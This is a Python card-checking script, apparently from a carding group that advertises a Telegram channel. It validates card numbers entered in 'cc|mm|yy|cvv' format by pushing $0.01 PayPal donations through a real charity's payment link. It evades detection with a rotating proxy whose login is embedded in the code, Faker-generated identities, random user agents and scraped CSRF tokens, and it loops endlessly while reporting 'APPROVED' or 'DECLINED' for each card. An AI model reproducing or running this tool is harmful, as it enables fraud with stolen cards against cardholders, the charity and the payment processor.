#=== by @MrNoob0913 ===
#=== Loliproject ===
#=== PaypalDonate  ===

import requests
from fake_useragent import UserAgent
from datetime import datetime
from faker import Faker
from urllib.parse import quote_plus
import json
import base64
import re
import random
import uuid
import webbrowser
import time

#=== Configuración de Proxy ===
PROXY_HOST = ''
PROXY_PORT = 000
PROXY_LOGIN = ''
PROXY_PASSWORD = ''
PROXY = f'http://v8TA2XzvaAe8cgrI:Lallawmkima123@geo.iproyal.com:12321'

def process_credit_card():
    #=== Session ===
    session = requests.Session()
    proxies = {
        "http": PROXY,
        "https": PROXY,
    }
    session.proxies.update(proxies)

    #=== Datos ===
    fake = Faker('en_US')
    first_name = fake.first_name()
    last_name = fake.last_name()
    address_1 = fake.street_address()
    city = fake.city()
    state = 'NY'
    ny_postcodes = [
        "10001", "10002", "10003", "10004", "10005", "10006", "10007", "10009", "10010",
        "10011", "10012", "10013", "10014", "10016", "10017", "10018", "10019", "10020",
        "10021", "10022", "10023", "10024", "10025", "10026", "10027", "10028", "10029",
        "10030", "10031", "10032", "10033", "10034", "10035", "10036", "10037", "10038",
        "10039", "10040", "10044", "10065", "10069", "10075", "10128", "10280", "10282",
        "10301", "10302", "10303", "10304", "10305", "10306", "10307", "10308", "10309",
        "10310", "10312", "10314", "10451", "10452", "10453", "10454", "10455", "10456",
        "10457", "10458", "10459", "10460", "10461", "10462", "10463", "10464", "10465",
        "10466", "10467", "10468", "10469", "10470", "10471", "10472", "10473", "10474",
        "10475", "11201", "11203", "11204", "11205", "11206", "11207", "11208", "11209",
        "11210", "11211", "11212", "11213", "11214", "11215", "11216", "11217", "11218",
        "11219", "11220", "11221", "11222", "11223", "11224", "11225", "11226", "11228",
        "11229", "11230", "11231", "11232", "11233", "11234", "11235", "11236", "11237",
        "11238", "11239", "11354", "11355", "11356", "11357", "11358", "11360", "11361",
        "11362", "11363", "11364", "11365", "11366", "11367", "11368", "11369", "11370",
        "11372", "11373", "11374", "11375", "11377", "11378", "11379", "11385", "11411",
        "11412", "11413", "11414", "11415", "11416", "11417", "11418", "11419", "11420",
        "11421", "11422", "11423", "11426", "11427", "11428", "11429", "11430", "11432",
        "11433", "11434", "11435", "11436", "11691", "11692", "11693", "11694", "11697"
    ]

    postcode = random.choice(ny_postcodes)
    email = fake.email(domain='gmail.com')
    area_code = fake.random_element(elements=('212', '347', '646', '718', '917', '929'))
    phone = fake.numerify(text=f'#######')
    name = f"{first_name}+{last_name}"
    email_encoded = quote_plus(email)
    session_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    ua = UserAgent()
    user_agent = ua.random
    session_id = f"uid_{uuid.uuid4().hex[:16]}_{uuid.uuid4().hex[:10]}"
    button_id = f"uid_{uuid.uuid4().hex[:16]}_{uuid.uuid4().hex[:10]}"


    #=== Manejo de CC
    card = input("cc: ")
    cc, mm, yy, ccv = card.split("|")

    cc_type = "VISA" if cc.startswith('4') else "MASTER_CARD" if cc.startswith('5') else "2" if cc.startswith('AMEX') else "3" if cc.startswith('3') else "DISCOVER"
    mm = mm.zfill(2)
    yy = '20' + yy if len(yy) == 2 else yy

    card_name = "VISA" if cc_type == "VISA" else "MASTER_CARD" if cc_type == "MASTER_CARD" else "DISCOVER" if cc_type == "2" else "AMERICAN EXPRESS" if cc_type == "AMEX" else "DISCOVER"

    print(f"━━━━━━━━⨴━━━━━━━━\n[CardInfo]\nType: {card_name}, Month: {mm}, Year: {yy}, CVV: {ccv}")

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': user_agent,
    }

    response = session.get('https://lpcenter.org/give/', headers=headers)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'referer': 'https://lpcenter.org/',
        'upgrade-insecure-requests': '1',
        'user-agent': user_agent,
    }

    response = session.get('https://www.paypal.com/ncp/payment/BKVC4EKUZY9K2', headers=headers)
    csrf_token_match = re.search(r'csrfToken["\']?\s*:\s*["\']([^"\']+)["\']', response.text)
    csrf_token = csrf_token_match.group(1)

    headers = {
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://www.paypal.com',
        'referer': 'https://www.paypal.com/ncp/payment/BKVC4EKUZY9K2',
        'user-agent': user_agent,
        'x-csrf-token': csrf_token,
    }

    json_data = {
        'link_id': 'BKVC4EKUZY9K2',
        'merchant_id': 'ZDZWVC4R4XCGQ',
        'quantity': '1',
        'amount': '0.01',
        'currency': 'USD',
        'currencySymbol': '$',
        'funding_source': 'CARD',
        'button_type': 'VARIABLE_PRICE',
        'csrfRetryEnabled': True,
    }
    response = session.post('https://www.paypal.com/ncp/api/create-order', headers=headers, json=json_data)
    order_data = response.json()
    if order_data.get('message') == 'CSRF_MISMATCH_RETRY': headers['x-csrf-token'] = order_data['csrfToken']; order_data = session.post('https://www.paypal.com/ncp/api/create-order', headers=headers, json=json_data).json()
    order_token, csrf_token = order_data['context_id'], order_data['csrfToken']

    headers = {
        'accept': '*/*',
        'accept-language': 'es-US,es-419;q=0.9,es;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://www.paypal.com',
        'paypal-client-context': order_token,
        'paypal-client-metadata-id': order_token,
        'priority': 'u=1, i',
        'referer': f'https://www.paypal.com/smart/card-fields?token={order_token}&sessionID={session_id}&buttonSessionID={button_id}&locale.x=es_US&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVhJOXVmRTBTMmNiRlhFaTcxa0hSdTlNYVFiTjAxVVlQdVFpZEp4akVfdDAwWWs2TmRTcjBqb1hodDRaM05Odnc2cGpaU0NxRy1wOTlGWlMmbWVyY2hhbnQtaWQ9WkRaV1ZDNFI0WENHUSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlzaWJpbGl0eSZjdXJyZW5jeT1VU0QmbG9jYWxlPWVzX1VTJmVuYWJsZS1mdW5kaW5nPXZlbm1vLHBheWxhdGVyIiwiYXR0cnMiOnsiZGF0YS1jc3Atbm9uY2UiOiJmOEY5OEpiUUJhcUEvR3dVc2pub0JJQ2tkNURFODVhaDE2UjRWNHc5YWxxS3I1aXgiLCJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXVpZCI6InVpZF9nbXVkdHBsc2dtb2JycHp4YmNrcWlsdnZmYm50amsifX0&disable-card=',
        'user-agent': user_agent,
        'x-app-name': 'standardcardfields',
        'x-country': 'US',
        'x-csrf-token': csrf_token,
    }

    json_data = {
        'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
        'variables': {
            'token': order_token,
            'card': {
                'cardNumber': cc,
                'type': cc_type,
                'expirationDate': f'{mm}/{yy}',
                'postalCode': postcode,
                'securityCode': ccv,
            },
            'phoneNumber': phone,
            'firstName': first_name,
            'lastName': last_name,
            'billingAddress': {
                'givenName': first_name,
                'familyName': last_name,
                'line1': address_1,
                'line2': None,
                'city': 'New York',
                'state': 'NY',
                'postalCode': postcode,
                'country': 'US',
            },
            'shippingAddress': {
                'givenName': first_name,
                'familyName': last_name,
                'line1': address_1,
                'line2': None,
                'city': 'New York',
                'state': 'NY',
                'postalCode': postcode,
                'country': 'US',
            },
            'email': email,
            'currencyConversionType': 'PAYPAL',
        },
        'operationName': None,
    }

    response = session.post(
        'https://www.paypal.com/graphql?fetch_credit_form_submit',
        headers=headers,
        json=json_data,
    )

    response_text = response.text

    if 'VALIDATION_ERROR' in response_text:
        jsonresponse = response.json()
        message = jsonresponse['errors'][0]['message']
        status = "APPROVED ✅"
        details = message
        msg = "APPROVED ✅"
        respuesta = message

    elif 'errors' in response_text:
        jsonresponse = response.json()
        try:
            code = jsonresponse['errors'][0]['data'][0]['code']
        except (KeyError, IndexError):
            code = 'NULL'

        message = jsonresponse['errors'][0]['message']

        if "INVALID_SECURITY_CODE" in code:
            status = "APPROVED CCN ✅"
            details = code
            msg = "APPROVED CCN ✅"
            respuesta = code

        elif "OAS_VALIDATION_ERROR" in code:
            status = "APPROVED ✅"
            details = code
            msg = "APPROVED ✅"
            respuesta = code

        elif "EXISTING_ACCOUNT_RESTRICTED" in code:
            status = "APPROVED ✅"
            details = code
            msg = "APPROVED ✅"
            respuesta = code

        elif "VALIDATION_ERROR" in code:
            status = "APPROVED ✅"
            details = code
            msg = "APPROVED ✅"
            respuesta = code

        else:
            status = "DECLINED ❌"
            details = code
            msg = "DECLINED ❌"
            respuesta = code

    elif 'is3DSecureRequired' in response_text:
        jsonresponse = response.json()
        is_3ds_required = (jsonresponse.get('data', {})
                                .get('approveGuestPaymentWithCreditCard', {})
                                .get('flags', {})
                                .get('is3DSecureRequired', False))

        if is_3ds_required == True:
            status = "APPROVED ✅"
            details = "3D REQUIRED"
            msg = "APPROVED ✅"
            respuesta = "3D REQUIRED"
        else:
            status = "APPROVED ✅"
            details = "CHARGED $0.01"
            msg = "APPROVED ✅"
            respuesta = "CHARGED $0.01"

    print(f"\n━━━━━━━━⨴━━━━━━━━")
    print(f"[Resultado]")
    print(f"Status: {status}")
    print(f"Message: {msg}")
    print(f"Details: {details}")
    print(f"Respuesta: {respuesta}")
    webbrowser.open('https://t.me/LoliScrapp')

    # Cerrar la sesión para limpiar todo
    session.close()
    print("\n" + "="*50)
    print("[Proceso completado:] Antispam 2 segundos...")
    print("="*50 + "\n")
    time.sleep(2)

#=== Bucle infinito ===
if __name__ == "__main__":
    print("=== Paypal Donate $0.01 ===")
    print("[Code:] @MrNoob0913\n")

    try:
        while True:
            process_credit_card()
    except KeyboardInterrupt:
        print("\n=== PROCESO DETENIDO POR EL USUARIO ===")
    except Exception as e:
        print(f"▶️ [Error inesperado: ] - {e}")
        print("\n" + "="*50)
        print("Reiniciando en 5 segundos...")
        print("="*50)
        time.sleep(5)
        # Reiniciar el bucle incluso si hay error
        while True:
            try:
                process_credit_card()
            except Exception as e:
                print(f"▶️ [Error:] - {e}")
                print("\n" + "="*50)
                print("Reiniciando en 5 segundos...")
                print("="*50)
                time.sleep(5)
